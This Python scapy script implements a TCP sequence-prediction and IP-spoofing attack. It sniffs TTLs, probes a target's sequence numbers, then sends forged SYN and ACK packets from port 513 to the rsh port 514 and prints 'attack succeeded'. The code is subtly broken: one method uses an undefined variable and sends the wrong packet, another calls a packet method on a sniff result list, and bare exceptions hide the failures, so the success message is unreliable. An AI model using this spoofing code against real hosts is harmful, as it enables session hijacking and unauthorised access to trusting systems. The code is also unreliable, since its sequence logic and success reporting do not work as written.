from scapy.all import *


def main():
    a = Attack('srcip', 'tgtip')
    a.DisplayTTL()
    a.fire_attack()


class Attack:

    def __init__(self, src, tgt, seqnum=None, pkt=None):
        self.src = src
        self.tgt = tgt
        self.seqnum = seqnum
        self.pkt = pkt

    def __repr__(self):
        return 'Attack from source: %s to target: %s' % (self.src, self.tgt)

    def __setattr__(self, key, value):
        if key in ['status', 'ttl', 'src', 'tgt', 'seqnum', 'pkt']:
            self.__dict__[key] = value
        else:
            raise AttributeError(key + ' not allowed')

    def __getitem__(self, item):
        l = [self.src, self.tgt, self.seqnum, self.pkt]
        v = [num for num in range(0, len(l))]
        dic = dict(zip(v, l))
        cls = type(self)
        if isinstance(item, int) and item < len(l):
            return dic[item]
        else:
            raise TypeError('%s not supporting slice' % cls.__name__)

    def __setitem__(self, key, value):
        if key in self:
            self.__dict__[key] = value
        else:
            raise AttributeError

    def __iter__(self):
        for att in self.__dict__:
            yield att
        return

    def DisplayTTL(self):
        self.pkt = sniff(count=1)
        try:
            if self.pkt.haslayer(IP):
                sourceIP = self.pkt.getlayer(IP).src
                ttl = str(self.pkt.ttl)
                print (ttl + '-> from' + sourceIP)
        except:
            pass

    def sequence_check(self):
        seqnum = 0
        prenum = 0
        diffseq = 0
        myset = set()
        for x in range(1, 5):
            if prenum != 0:
                prenum = seqnum
            pkt = IP(dst=tgt) / TCP()
            answer = sr1(self.pkt, verbose=0)
            seqnum = answer.getlayer(TCP).seq
            diffseq = seqnum - prenum
            print("TCP sequence is differenciated at " + str(diffseq))
            myset.add(diffseq)
        if len(myset) == 1:
            self.seqnum = seqnum
        else:
            print("Can't spoof unpredictable tcp sequence number")
    def fire_attack(self):
        if self.seqnum is None:
            return self.sequence_check()
        iplayer = IP(src=self.src, dst=self.tgt)
        tcplayer = TCP(sport=513, dport=514)
        pkt_SYN = iplayer / tcplayer
        send(pkt_SYN)
        iplayer = IP(src=self.src, dst=self.tgt)
        tcplayer = TCP(sport=513, dport=514, ack=self.seqnum)
        pkt_ACK = iplayer / tcplayer
        try:
            send(pkt_ACK)
            print ('attack succeeded')
        except:
            pass


if __name__ == '__main__':
    main()
